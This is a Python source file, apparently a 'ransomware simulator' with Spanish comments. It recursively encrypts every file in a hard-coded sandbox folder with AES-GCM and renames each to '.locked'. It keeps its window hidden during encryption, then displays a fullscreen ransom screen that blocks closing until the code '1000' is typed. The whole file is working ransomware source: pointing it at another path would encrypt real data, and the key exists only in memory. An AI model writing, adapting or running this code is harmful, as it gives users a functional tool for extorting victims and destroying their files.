import os
import time
from pathlib import Path
import threading
import tkinter as tk
from tkinter import messagebox
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# CONFIGURACIÓN
SANDBOX_DIR = Path(r"C:\ransom_sandbox")  # Ruta de pruebas
EXT = ".locked"
WAIT_TIME = 5  # segundos entre carpetas

# Guardar esta clave para descifrar
MASTER_KEY = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(MASTER_KEY)


def list_folders(base_dir):
    """Lista todas las carpetas (incluyendo la raíz) que contengan archivos no cifrados."""
    folders = set()
    for root, _, filenames in os.walk(base_dir):
        for f in filenames:
            if not f.endswith(EXT):
                folders.add(Path(root))
    return sorted(folders)


def list_files_in_folder(folder):
    """Lista archivos no cifrados dentro de una carpeta."""
    return [p for p in folder.iterdir() if p.is_file() and not p.name.endswith(EXT)]


def list_encrypted_files(base_dir):
    """Lista archivos cifrados."""
    return [
        Path(root) / f
        for root, _, filenames in os.walk(base_dir)
        for f in filenames
        if f.endswith(EXT)
    ]


def encrypt_file(path: Path):
    try:
        data = path.read_bytes()
        nonce = os.urandom(12)
        ct = aesgcm.encrypt(nonce, data, None)
        path.write_bytes(nonce + ct)
        path.rename(str(path) + EXT)
    except Exception as e:
        print(f"[ERROR cifrar] {path}: {e}")


def decrypt_file(path: Path):
    try:
        payload = path.read_bytes()
        nonce, ct = payload[:12], payload[12:]
        data = aesgcm.decrypt(nonce, ct, None)
        original_path = path.with_suffix("")
        original_path.write_bytes(data)
        path.unlink()
    except Exception as e:
        print(f"[ERROR descifrar] {path}: {e}")


def show_fullscreen_warning():
    """Pantalla completa bloqueante hasta que se ingrese el código correcto."""
    for widget in root.winfo_children():
        widget.destroy()

    root.configure(bg="#111111")

    tk.Label(
        root,
        text="¡TUS ARCHIVOS HAN SIDO ENCRIPTADOS!",
        font=("Arial", 30, "bold"),
        fg="red",
        bg="#111111",
        pady=30
    ).pack()

    tk.Label(
        root,
        text="Introduce el código para restaurar los archivos:",
        font=("Arial", 16),
        fg="yellow",
        bg="#111111"
    ).pack(pady=20)

    code_entry = tk.Entry(root, font=("Arial", 20), justify="center")
    code_entry.pack(pady=20)

    def try_decrypt():
        if code_entry.get() == "1000":
            decrypted_files = 0
            for p in list_encrypted_files(SANDBOX_DIR):
                decrypt_file(p)
                decrypted_files += 1
            messagebox.showinfo("Restauración completa",
                                f"{decrypted_files} archivos restaurados.")
            root.destroy()
        else:
            messagebox.showerror("Error", "Código incorrecto.")

    tk.Button(
        root,
        text="Desbloquear",
        font=("Arial", 18, "bold"),
        bg="#44aa44",
        fg="white",
        relief="flat",
        padx=30,
        pady=15,
        command=try_decrypt
    ).pack(pady=40)

    root.protocol("WM_DELETE_WINDOW", lambda: None)


def start_encryption():
    """Cifrar por carpetas, esperando 5 segundos entre cada una, mostrando en consola el progreso."""
    folders = list_folders(SANDBOX_DIR)

    # Total de archivos por cifrar
    total_files = sum(len(list_files_in_folder(folder)) for folder in folders)
    encrypted_count = 0

    for folder in folders:
        files = list_files_in_folder(folder)
        for f in files:
            encrypt_file(f)
            encrypted_count += 1
            remaining = total_files - encrypted_count
            percent_left = (remaining / total_files) * \
                100 if total_files else 0
            print(
                f"Cifrado: {f} | Restantes: {remaining} ({percent_left:.2f}%)")
        time.sleep(WAIT_TIME)  # Espera antes de pasar a la siguiente carpeta

    # Cuando termine, mostrar la pantalla fullscreen y arrancar mainloop
    # Usamos root.after para iniciar la interfaz en el hilo principal
    root.after(0, lambda: (
        root.deiconify(),                   # <-- Hacer la ventana visible
        root.attributes("-fullscreen", True),
        show_fullscreen_warning()
    ))


# ----------------- INTERFAZ -----------------
root = tk.Tk()
root.title("Simulador de Cifrado")

# No poner fullscreen ni interfaz visible aún
root.withdraw()  # Ocultamos ventana mientras cifra

# Lanzamos cifrado en hilo separado
threading.Thread(target=start_encryption, daemon=True).start()

# Mostramos ventana principal solo cuando termine cifrado (en start_encryption)
root.mainloop()
